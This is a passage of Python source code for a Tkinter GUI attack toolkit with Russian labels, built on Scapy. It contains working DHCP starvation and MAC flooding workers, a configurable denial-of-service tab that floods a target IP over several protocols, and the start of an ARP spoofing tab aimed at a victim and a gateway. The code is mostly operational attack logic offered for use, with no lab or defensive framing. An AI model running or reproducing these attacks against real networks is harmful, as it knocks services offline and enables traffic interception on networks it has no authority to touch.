        self.dhcp_request_count.insert(0, "1000")
        
        separator = ttk.Separator(params_frame, orient='horizontal')
        separator.pack(fill='x', padx=5, pady=10)
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=5)
        
        self.dhcp_start_btn = ttk.Button(button_frame, text="Начать DHCP Starvation", 
                                       command=self.start_dhcp_attack, width=22)
        self.dhcp_start_btn.pack(side='left', padx=5)
        
        self.dhcp_stop_btn = ttk.Button(button_frame, text="Остановить атаку", 
                                      command=self.stop_dhcp_attack, width=18, state='disabled')
        self.dhcp_stop_btn.pack(side='left', padx=5)
        
        separator2 = ttk.Separator(main_frame, orient='horizontal')
        separator2.pack(fill='x', padx=5, pady=10)
        
        stats_frame = ttk.LabelFrame(main_frame, text="Статистика DHCP Starvation")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_sent = ttk.Label(stats_grid, text="0", width=10, anchor='w')
        self.dhcp_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость отправки:", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_current_rate = ttk.Label(stats_grid, text="0 пак/сек", width=15, anchor='w')
        self.dhcp_current_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Уникальных MAC:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_unique_macs = ttk.Label(stats_grid, text="0", width=10, anchor='w')
        self.dhcp_unique_macs.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=3, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_duration = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.dhcp_duration.grid(row=3, column=1, padx=5, pady=2, sticky='w')
        
        separator3 = ttk.Separator(main_frame, orient='horizontal')
        separator3.pack(fill='x', padx=5, pady=10)
        
        log_frame = ttk.LabelFrame(main_frame, text="Лог DHCP Starvation")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.dhcp_log = scrolledtext.ScrolledText(log_frame, height=15, wrap=tk.WORD, font=('Consolas', 8))
        self.dhcp_log.pack(fill='both', expand=True, padx=5, pady=5)
        
        ttk.Button(log_frame, text="Сохранить логи", 
                  command=lambda: self.save_log(self.dhcp_log), width=14).pack(pady=5)

    def start_dhcp_attack(self):
        self.dhcp_attack_running = True
        self.dhcp_start_btn.config(state='disabled')
        self.dhcp_stop_btn.config(state='normal')
        
        try:
            pool_size = int(self.dhcp_pool_size.get())
            request_count = int(self.dhcp_request_count.get())
        except:
            pool_size = 254
            request_count = 1000
        
        self.dhcp_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'unique_macs': set(),
            'last_update': time.time(),
            'last_sent': 0
        }
        
        self.dhcp_thread = threading.Thread(
            target=self.dhcp_attack_worker,
            args=(self.dhcp_interface.get(), pool_size, request_count)
        )
        self.dhcp_thread.daemon = True
        self.dhcp_thread.start()
        
        self.update_dhcp_stats()
        
        self.dhcp_log.insert('end', f"Запущена DHCP Starvation атака (размер пула: {pool_size} IP)\n")
        self.status_var.set("DHCP Starvation атака запущена")
    
    def stop_dhcp_attack(self):
        self.dhcp_attack_running = False
        self.dhcp_start_btn.config(state='normal')
        self.dhcp_stop_btn.config(state='disabled')
        
        if self.dhcp_thread and self.dhcp_thread.is_alive():
            self.dhcp_thread.join(timeout=1.0)
        
        total_time = time.time() - self.dhcp_stats['start_time']
        total_packets = self.dhcp_stats['sent_packets']
        
        self.dhcp_log.insert('end', "DHCP Starvation атака остановлена\n")
        self.dhcp_log.insert('end', f"Итоговая статистика:\n")
        self.dhcp_log.insert('end', f"  • Всего пакетов: {total_packets}\n")
        self.dhcp_log.insert('end', f"  • Уникальных MAC: {len(self.dhcp_stats['unique_macs'])}\n")
        self.dhcp_log.insert('end', f"  • Общее время: {total_time:.1f} сек\n")
        self.dhcp_log.insert('end', f"  • Средняя скорость: {int(total_packets/total_time) if total_time > 0 else 0} пак/сек\n")
        
        self.status_var.set("DHCP Starvation атака остановлена")
    
    def update_dhcp_stats(self):
        if not self.dhcp_attack_running:
            return
            
        current_time = time.time()
        duration = current_time - self.dhcp_stats['start_time']
        time_diff = current_time - self.dhcp_stats['last_update']
        
        if time_diff >= 1:
            packets_sent = self.dhcp_stats['sent_packets'] - self.dhcp_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            
            self.dhcp_current_rate.config(text=f"{int(current_rate)} пак/сек")
            self.dhcp_stats['last_update'] = current_time
            self.dhcp_stats['last_sent'] = self.dhcp_stats['sent_packets']
        
        self.dhcp_sent.config(text=str(self.dhcp_stats['sent_packets']))
        self.dhcp_unique_macs.config(text=str(len(self.dhcp_stats['unique_macs'])))
        
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.dhcp_duration.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        
        if self.dhcp_attack_running:
            self.root.after(1000, self.update_dhcp_stats)
    
    def dhcp_attack_worker(self, interface, pool_size, request_count):
        try:
            packet_count = 0
            used_macs = set()
            
            self.dhcp_log.insert('end', f"Начало DHCP Starvation атаки по схеме DORA для {pool_size} IP-адресов\n")
            
            while self.dhcp_attack_running and packet_count < request_count:
                mac = self.generate_random_mac()
                if mac in used_macs:
                    continue
                    
                used_macs.add(mac)
                mac_bytes = bytes.fromhex(mac.replace(':', ''))
                
                dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                               IP(src="0.0.0.0", dst="255.255.255.255") / \
                               UDP(sport=68, dport=67) / \
                               BOOTP(chaddr=mac_bytes, xid=random.randint(1, 0xFFFFFFFF)) / \
                               DHCP(options=[("message-type", "discover"), "end"])
                
                sendp(dhcp_discover, iface=interface, verbose=0)
                packet_count += 1
                self.dhcp_stats['sent_packets'] = packet_count
                self.dhcp_stats['unique_macs'] = used_macs
                
                time.sleep(0.05)
                
                dhcp_request = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                              IP(src="0.0.0.0", dst="255.255.255.255") / \
                              UDP(sport=68, dport=67) / \
                              BOOTP(chaddr=mac_bytes, xid=random.randint(1, 0xFFFFFFFF)) / \
                              DHCP(options=[("message-type", "request"), "end"])
                
                sendp(dhcp_request, iface=interface, verbose=0)
                packet_count += 1
                self.dhcp_stats['sent_packets'] = packet_count
                
                if packet_count % 20 == 0:
                    self.dhcp_log.insert('end', f"Отправлено {packet_count}/{request_count} DHCP пакетов\n")
                    self.dhcp_log.see('end')
                    self.status_var.set(f"DHCP Starvation: {packet_count}/{request_count}")
                
                time.sleep(0.05)
                
                if len(used_macs) >= pool_size:
                    self.dhcp_log.insert('end', f"Достигнут лимит уникальных MAC-адресов ({pool_size})\n")
                    used_macs.clear()
                    time.sleep(1)
            
            if packet_count >= request_count:
                self.dhcp_log.insert('end', f"DHCP Starvation атака завершена! Отправлено {packet_count} пакетов\n")
                self.status_var.set("DHCP Starvation атака завершена")
                        
        except Exception as e:
            self.dhcp_log.insert('end', f"Ошибка DHCP Starvation атаки: {str(e)}\n")

    def setup_custom_attack_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        params_frame = ttk.LabelFrame(main_frame, text="Параметры Dos атаки")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row1, text="IP адрес:", width=15, anchor='w').pack(side='left', padx=5)
        self.custom_ip = ttk.Entry(row1, width=20, font=('Arial', 9))
        self.custom_ip.pack(side='left', padx=5)
        self.custom_ip.insert(0, "192.168.1.1")
        
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row2, text="Протокол:", width=15, anchor='w').pack(side='left', padx=5)
        self.custom_protocol = ttk.Combobox(row2, values=[
            "ICMP", "TCP", "UDP", "ARP", "DNS"
        ], width=20, font=('Arial', 9))
        self.custom_protocol.pack(side='left', padx=5)
        self.custom_protocol.set("TCP")
        
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row3, text="Порт:", width=15, anchor='w').pack(side='left', padx=5)
        self.custom_port = ttk.Entry(row3, width=20, font=('Arial', 9))
        self.custom_port.pack(side='left', padx=5)
        self.custom_port.insert(0, "23")
        
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row4, text="Размер пакета:", width=15, anchor='w').pack(side='left', padx=5)
        self.custom_packet_size = ttk.Entry(row4, width=20, font=('Arial', 9))
        self.custom_packet_size.pack(side='left', padx=5)
        self.custom_packet_size.insert(0, "1024")
        
        row5 = ttk.Frame(params_frame)
        row5.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row5, text="Кол-во пакетов:", width=15, anchor='w').pack(side='left', padx=5)
        self.custom_packet_count = ttk.Entry(row5, width=20, font=('Arial', 9))
        self.custom_packet_count.pack(side='left', padx=5)
        self.custom_packet_count.insert(0, "10000")
        
        row6 = ttk.Frame(params_frame)
        row6.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row6, text="Задержка (сек):", width=15, anchor='w').pack(side='left', padx=5)
        self.custom_delay = ttk.Entry(row6, width=20, font=('Arial', 9))
        self.custom_delay.pack(side='left', padx=5)
        self.custom_delay.insert(0, "0")
        
        row7 = ttk.Frame(params_frame)
        row7.pack(fill='x', padx=5, pady=3)
        
        self.custom_continuous = tk.BooleanVar()
        ttk.Checkbutton(row7, text="Непрерывный режим", 
                       variable=self.custom_continuous).pack(side='left', padx=5)
        
        row8 = ttk.Frame(params_frame)
        row8.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row8, text="Интерфейс:", width=15, anchor='w').pack(side='left', padx=5)
        self.custom_interface = ttk.Combobox(row8, width=20, font=('Arial', 9), values=self.network_interfaces)
        self.custom_interface.pack(side='left', padx=5)
        self.custom_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        separator = ttk.Separator(params_frame, orient='horizontal')
        separator.pack(fill='x', padx=5, pady=10)
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=5)
        
        self.custom_start_btn = ttk.Button(button_frame, text="Начать Dos атаку", 
                                         command=self.start_custom_attack, width=15)
        self.custom_start_btn.pack(side='left', padx=5)
        
        self.custom_stop_btn = ttk.Button(button_frame, text="Остановить атаку", 
                                        command=self.stop_custom_attack, width=15, state='disabled')
        self.custom_stop_btn.pack(side='left', padx=5)
        
        separator2 = ttk.Separator(main_frame, orient='horizontal')
        separator2.pack(fill='x', padx=5, pady=10)
        
        stats_frame = ttk.LabelFrame(main_frame, text="Статистика Dos атаки")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.custom_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.custom_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость отправки:", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.custom_current_rate = ttk.Label(stats_grid, text="0 пак/сек", width=15, anchor='w')
        self.custom_current_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Получено ответов:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.custom_received = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.custom_received.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=3, column=0, padx=5, pady=2, sticky='w')
        self.custom_duration = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.custom_duration.grid(row=3, column=1, padx=5, pady=2, sticky='w')
        
        separator3 = ttk.Separator(main_frame, orient='horizontal')
        separator3.pack(fill='x', padx=5, pady=10)
        
        log_frame = ttk.LabelFrame(main_frame, text="Лог Dos атаки")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.custom_log = scrolledtext.ScrolledText(log_frame, height=15, wrap=tk.WORD, font=('Consolas', 8))
        self.custom_log.pack(fill='both', expand=True, padx=5, pady=5)
        
        ttk.Button(log_frame, text="Сохранить логи", 
                  command=lambda: self.save_log(self.custom_log), width=14).pack(pady=5)

    def start_custom_attack(self):
        if self.custom_attack_running:
            return
            
        self.custom_attack_running = True
        self.custom_start_btn.config(state='disabled')
        self.custom_stop_btn.config(state='normal')
        
        target_ip = self.custom_ip.get()
        protocol = self.custom_protocol.get()
        port = int(self.custom_port.get())
        packet_size = int(self.custom_packet_size.get())
        packet_count = int(self.custom_packet_count.get())
        delay = float(self.custom_delay.get())
        continuous = self.custom_continuous.get()
        
        if delay < 0:
            delay = 0
        
        self.custom_log.insert('end', f"🚀 Запуск высокопроизводительной Dos атаки\n")
        self.custom_log.insert('end', f"🎯 Цель: {target_ip}\n")
        self.custom_log.insert('end', f"📦 Протокол: {protocol}, Порт: {port}\n")
        self.custom_log.insert('end', f"⚡ Размер пакета: {packet_size} байт\n")
        self.custom_log.insert('end', f"🌀 Режим: {'Непрерывный' if continuous else f'{packet_count} пакетов'}\n")
        self.custom_log.insert('end', f"⏱️  Задержка: {delay} сек\n")
        
        self.custom_attack_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'received_packets': 0,
            'last_update': time.time(),
            'last_sent': 0
        }
        
        self.dos_attack.start(target_ip, protocol, port, packet_size, packet_count, delay, continuous)
        
        self.update_custom_attack_stats()
        
        self.status_var.set("Высокопроизводительная Dos атака запущена")

    def stop_custom_attack(self):
        if not self.custom_attack_running:
            return
            
        self.custom_attack_running = False
        self.custom_start_btn.config(state='normal')
        self.custom_stop_btn.config(state='disabled')
        
        self.dos_attack.stop()
        
        stats = self.dos_attack.get_stats()
        total_packets = stats['sent_packets']
        total_time = time.time() - stats['start_time']
        avg_rate = total_packets / total_time if total_time > 0 else 0
        
        self.custom_log.insert('end', f"🛑 Dos атака остановлена\n")
        self.custom_log.insert('end', f"📊 Итоговая статистика:\n")
        self.custom_log.insert('end', f"   • Всего пакетов: {total_packets}\n")
        self.custom_log.insert('end', f"   • Общее время: {total_time:.1f} сек\n")
        self.custom_log.insert('end', f"   • Средняя скорость: {int(avg_rate)} пак/сек\n")
        
        self.status_var.set("Dos атака остановлена")

    def update_custom_attack_stats(self):
        if not self.custom_attack_running:
            return
            
        stats = self.dos_attack.get_stats()
        current_time = time.time()
        duration = current_time - stats['start_time']
        time_diff = current_time - stats['last_update']
        
        if time_diff >= 1:
            packets_sent = stats['sent_packets'] - stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            
            self.custom_current_rate.config(text=f"{int(current_rate)} пак/сек")
            stats['last_update'] = current_time
            stats['last_sent'] = stats['sent_packets']
        
        self.custom_sent.config(text=str(stats['sent_packets']))
        
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.custom_duration.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        
        if self.custom_attack_running:
            self.root.after(1000, self.update_custom_attack_stats)

    def setup_mac_flood_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        params_frame = ttk.LabelFrame(main_frame, text="Параметры MAC Flood атаки")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row1, text="Интерфейс:", width=15, anchor='w').pack(side='left', padx=5)
        self.mac_flood_interface = ttk.Combobox(row1, width=20, font=('Arial', 9), values=self.network_interfaces)
        self.mac_flood_interface.pack(side='left', padx=5)
        self.mac_flood_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row2, text="Целевой MAC:", width=15, anchor='w').pack(side='left', padx=5)
        self.mac_flood_target = ttk.Entry(row2, width=20, font=('Arial', 9))
        self.mac_flood_target.pack(side='left', padx=5)
        self.mac_flood_target.insert(0, "ff:ff:ff:ff:ff:ff")
        
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row3, text="Кол-во пакетов:", width=15, anchor='w').pack(side='left', padx=5)
        self.mac_flood_count = ttk.Entry(row3, width=20, font=('Arial', 9))
        self.mac_flood_count.pack(side='left', padx=5)
        self.mac_flood_count.insert(0, "10000")
        
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row4, text="Размер пакета:", width=15, anchor='w').pack(side='left', padx=5)
        self.mac_flood_size = ttk.Entry(row4, width=20, font=('Arial', 9))
        self.mac_flood_size.pack(side='left', padx=5)
        self.mac_flood_size.insert(0, "128")
        
        row5 = ttk.Frame(params_frame)
        row5.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row5, text="Задержка (сек):", width=15, anchor='w').pack(side='left', padx=5)
        self.mac_flood_delay = ttk.Entry(row5, width=20, font=('Arial', 9))
        self.mac_flood_delay.pack(side='left', padx=5)
        self.mac_flood_delay.insert(0, "0.001")
        
        row6 = ttk.Frame(params_frame)
        row6.pack(fill='x', padx=5, pady=3)
        
        self.mac_flood_random = tk.BooleanVar(value=True)
        ttk.Checkbutton(row6, text="Случайные MAC", 
                       variable=self.mac_flood_random).pack(side='left', padx=5)
        
        separator = ttk.Separator(params_frame, orient='horizontal')
        separator.pack(fill='x', padx=5, pady=10)
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=5)
        
        self.mac_flood_start_btn = ttk.Button(button_frame, text="Начать MAC Flood", 
                                            command=self.start_mac_flood, width=16)
        self.mac_flood_start_btn.pack(side='left', padx=5)
        
        self.mac_flood_stop_btn = ttk.Button(button_frame, text="Остановить атаку", 
                                           command=self.stop_mac_flood, width=15, state='disabled')
        self.mac_flood_stop_btn.pack(side='left', padx=5)
        
        separator2 = ttk.Separator(main_frame, orient='horizontal')
        separator2.pack(fill='x', padx=5, pady=10)
        
        stats_frame = ttk.LabelFrame(main_frame, text="Статистика атаки")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.mac_flood_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.mac_flood_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость отправки:", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.mac_flood_current_rate = ttk.Label(stats_grid, text="0 пак/сек", width=15, anchor='w')
        self.mac_flood_current_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Уникальных MAC:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.mac_flood_unique_macs = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.mac_flood_unique_macs.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=3, column=0, padx=5, pady=2, sticky='w')
        self.mac_flood_duration = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.mac_flood_duration.grid(row=3, column=1, padx=5, pady=2, sticky='w')
        
        separator3 = ttk.Separator(main_frame, orient='horizontal')
        separator3.pack(fill='x', padx=5, pady=10)
        
        log_frame = ttk.LabelFrame(main_frame, text="Лог MAC Flood")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.mac_flood_log = scrolledtext.ScrolledText(log_frame, height=12, wrap=tk.WORD, font=('Consolas', 8))
        self.mac_flood_log.pack(fill='both', expand=True, padx=5, pady=5)
        
        ttk.Button(log_frame, text="Сохранить логи", 
                  command=lambda: self.save_log(self.mac_flood_log), width=14).pack(pady=4)

    def generate_random_mac(self):
        return "%02x:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )

    def start_mac_flood(self):
        self.mac_flood_running = True
        self.mac_flood_start_btn.config(state='disabled')
        self.mac_flood_stop_btn.config(state='normal')
        
        try:
            count = int(self.mac_flood_count.get())
            packet_size = int(self.mac_flood_size.get())
            delay = float(self.mac_flood_delay.get())
        except:
            count = 10000
            packet_size = 128
            delay = 0.001
        
        self.mac_flood_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'unique_macs': set(),
            'last_update': time.time()
        }
        
        self.mac_flood_thread = threading.Thread(
            target=self.mac_flood_worker,
            args=(self.mac_flood_interface.get(), count, packet_size, delay)
        )
        self.mac_flood_thread.daemon = True
        self.mac_flood_thread.start()
        
        self.update_mac_flood_stats()
        
        self.mac_flood_log.insert('end', f"Запущен улучшенный MAC Flood\n")
        self.mac_flood_log.insert('end', f"Целевой MAC: {self.mac_flood_target.get()}\n")
        self.mac_flood_log.insert('end', f"Пакетов: {count}, Размер: {packet_size} байт\n")
        self.mac_flood_log.insert('end', f"Задержка: {delay} сек\n")
        self.status_var.set("MAC Flood запущен")

    def stop_mac_flood(self):
        self.mac_flood_running = False
        self.mac_flood_start_btn.config(state='normal')
        self.mac_flood_stop_btn.config(state='disabled')
        
        if self.mac_flood_thread and self.mac_flood_thread.is_alive():
            self.mac_flood_thread.join(timeout=1.0)
            
        total_time = time.time() - self.mac_flood_stats['start_time']
        total_packets = self.mac_flood_stats['sent_packets']
        
        self.mac_flood_log.insert('end', "MAC Flood остановлен\n")
        self.mac_flood_log.insert('end', f"Итоговая статистика:\n")
        self.mac_flood_log.insert('end', f"  • Всего пакетов: {total_packets}\n")
        self.mac_flood_log.insert('end', f"  • Уникальных MAC: {len(self.mac_flood_stats['unique_macs'])}\n")
        self.mac_flood_log.insert('end', f"  • Общее время: {total_time:.1f} сек\n")
        self.mac_flood_log.insert('end', f"  • Средняя скорость: {int(total_packets/total_time) if total_time > 0 else 0} пак/сек\n")
        
        self.status_var.set("MAC Flood остановлен")

    def update_mac_flood_stats(self):
        if not self.mac_flood_running:
            return
            
        current_time = time.time()
        duration = current_time - self.mac_flood_stats['start_time']
        
        self.mac_flood_sent.config(text=str(self.mac_flood_stats['sent_packets']))
        self.mac_flood_unique_macs.config(text=str(len(self.mac_flood_stats['unique_macs'])))
        
        time_diff = current_time - self.mac_flood_stats['last_update']
        if time_diff >= 1:
            packets_sent = self.mac_flood_stats['sent_packets'] - self.mac_flood_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            self.mac_flood_current_rate.config(text=f"{int(current_rate)} пак/сек")
            self.mac_flood_stats['last_update'] = current_time
            self.mac_flood_stats['last_sent'] = self.mac_flood_stats['sent_packets']
        
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.mac_flood_duration.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        
        if self.mac_flood_running:
            self.root.after(1000, self.update_mac_flood_stats)

    def mac_flood_worker(self, interface, total_count, packet_size, delay):
        try:
            packet_count = 0
            used_macs = set()
            target_mac = self.mac_flood_target.get()
            use_random_mac = self.mac_flood_random.get()
            
            start_time = time.time()
            
            self.mac_flood_log.insert('end', f"Начало улучшенного MAC Flood атаки\n")
            
            while self.mac_flood_running and packet_count < total_count:
                if use_random_mac:
                    src_mac = self.generate_random_mac()
                    while src_mac in used_macs:
                        src_mac = self.generate_random_mac()
                    used_macs.add(src_mac)
                else:
                    src_mac = self.generate_random_mac()
                
                payload = b'X' * max(0, packet_size - 14)
                
                packet = Ether(src=src_mac, dst=target_mac) / Raw(load=payload)
                
                try:
                    sendp(packet, iface=interface, verbose=0)
                    packet_count += 1
                    
                    self.mac_flood_stats['sent_packets'] = packet_count
                    self.mac_flood_stats['unique_macs'] = used_macs
                    
                except Exception as e:
                    self.mac_flood_log.insert('end', f"Ошибка отправки пакета: {str(e)}\n")
                    break
                
                if delay > 0:
                    sleep_time = delay
                    interval = 0.01
                    while sleep_time > 0 and self.mac_flood_running:
                        time.sleep(min(interval, sleep_time))
                        sleep_time -= interval
                
                if packet_count % 1000 == 0:
                    elapsed = time.time() - start_time
                    rate = packet_count / elapsed if elapsed > 0 else 0
                    self.mac_flood_log.insert('end', 
                        f"Отправлено {packet_count}/{total_count} пакетов "
                        f"(Скорость: {int(rate)} пак/сек, Уникальных MAC: {len(used_macs)})\n")
                    self.mac_flood_log.see('end')
            
            total_time = time.time() - start_time
            final_rate = packet_count / total_time if total_time > 0 else 0
            self.mac_flood_log.insert('end', 
                f"MAC Flood завершен. Итого: {packet_count} пакетов, "
                f"{len(used_macs)} уникальных MAC, средняя скорость: {int(final_rate)} пак/сек\n")
            self.status_var.set("MAC Flood завершен")
                        
        except Exception as e:
            self.mac_flood_log.insert('end', f"Ошибка MAC Flood: {str(e)}\n")

    def setup_arp_spoof_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        params_frame = ttk.LabelFrame(main_frame, text="Параметры ARP Spoofing")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row1, text="Целевой IP:", width=15, anchor='w').pack(side='left', padx=5)
        self.arp_target_ip = ttk.Entry(row1, width=20, font=('Arial', 9))
        self.arp_target_ip.pack(side='left', padx=5)
        self.arp_target_ip.insert(0, "192.168.1.100")
        
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row2, text="Шлюз IP:", width=15, anchor='w').pack(side='left', padx=5)
        self.arp_gateway_ip = ttk.Entry(row2, width=20, font=('Arial', 9))
        self.arp_gateway_ip.pack(side='left', padx=5)
        self.arp_gateway_ip.insert(0, "192.168.1.1")
        
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row3, text="Интерфейс:", width=15, anchor='w').pack(side='left', padx=5)
        self.arp_spoof_interface = ttk.Combobox(row3, width=20, font=('Arial', 9), values=self.network_interfaces)
        self.arp_spoof_interface.pack(side='left', padx=5)
        self.arp_spoof_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=3)
        
        ttk.Label(row4, text="Интервал (сек):", width=15, anchor='w').pack(side='left', padx=5)
        self.arp_spoof_interval = ttk.Entry(row4, width=20, font=('Arial', 9))
        self.arp_spoof_interval.pack(side='left', padx=5)
        self.arp_spoof_interval.insert(0, "2")
        
        separator = ttk.Separator(params_frame, orient='horizontal')
        separator.pack(fill='x', padx=5, pady=10)
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=5)
        
        self.arp_spoof_start_btn = ttk.Button(button_frame, text="Начать ARP Spoofing", 
                                            command=self.start_arp_spoof, width=18)
        self.arp_spoof_start_btn.pack(side='left', padx=5)
        
        self.arp_spoof_stop_btn = ttk.Button(button_frame, text="Остановить атаку", 
                                           command=self.stop_arp_spoof, width=15, state='disabled')
        self.arp_spoof_stop_btn.pack(side='left', padx=5)
        
        separator2 = ttk.Separator(main_frame, orient='horizontal')
        separator2.pack(fill='x', padx=5, pady=10)
        
        stats_frame = ttk.LabelFrame(main_frame, text="Статистика ARP Spoofing")
        stats_frame.pack(fill='x', padx=5, pady=5)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.arp_spoof_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Скорость отправки:", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_current_rate = ttk.Label(stats_grid, text="0 пак/сек", width=15, anchor='w')
        self.arp_spoof_current_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_duration = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.arp_spoof_duration.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        
        separator3 = ttk.Separator(main_frame, orient='horizontal')
        separator3.pack(fill='x', padx=5, pady=10)
        
        log_frame = ttk.LabelFrame(main_frame, text="Лог ARP Spoofing")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.arp_spoof_log = scrolledtext.ScrolledText(log_frame, height=20, wrap=tk.WORD, font=('Consolas', 8))
